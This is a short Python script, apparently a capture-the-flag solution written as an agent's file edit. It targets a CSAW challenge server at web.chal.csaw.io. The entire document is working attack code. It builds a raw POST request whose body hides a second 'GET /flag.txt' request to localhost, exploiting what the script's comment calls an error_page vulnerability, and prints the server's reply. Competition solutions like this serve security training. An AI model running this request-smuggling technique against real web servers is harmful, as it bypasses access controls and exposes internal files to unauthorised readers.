import socket

HOST = "web.chal.csaw.io"
PORT = 3009

def send_raw(data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((HOST, PORT))
    s.sendall(data)
    resp = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
    except socket.timeout:
        pass
    s.close()
    return resp

# Smuggle a request to /flag.txt via the error_page vulnerability
smuggled = b"GET /flag.txt HTTP/1.1\r\nHost: localhost\r\n\r\n"

body = smuggled
req = b"POST /flag HTTP/1.1\r\n"
req += b"Host: web.chal.csaw.io\r\n"
req += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
req += b"Content-Type: application/x-www-form-urlencoded\r\n"
req += b"Connection: keep-alive\r\n"
req += b"\r\n"
req += body

resp = send_raw(req)
print(resp.decode(errors="replace"))
end_of_edit

